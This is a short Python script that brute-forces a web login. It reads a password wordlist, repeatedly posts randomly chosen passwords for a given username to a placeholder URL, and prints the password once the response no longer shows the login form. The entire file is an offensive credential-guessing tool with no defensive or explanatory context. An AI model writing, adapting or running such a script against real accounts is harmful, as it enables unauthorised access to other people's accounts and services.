import requests
import random

user = input("Enter username: ")
list_pwd = []
with open ("your_file_here.txt") as txt:
    list_pwd = [pwd.strip() for pwd in txt]

i = False
while i == False:
    mot = "username"
    password = random.choice(list_pwd)

    url ="Your_URL_here"
    payload = {'username': user, 'password': password.rstrip()}
    r = requests.post(url, data=payload)
    re = r.text
    if mot in re:
        print("Loading..")
    else: 
        print("Password: ", password)
        i = True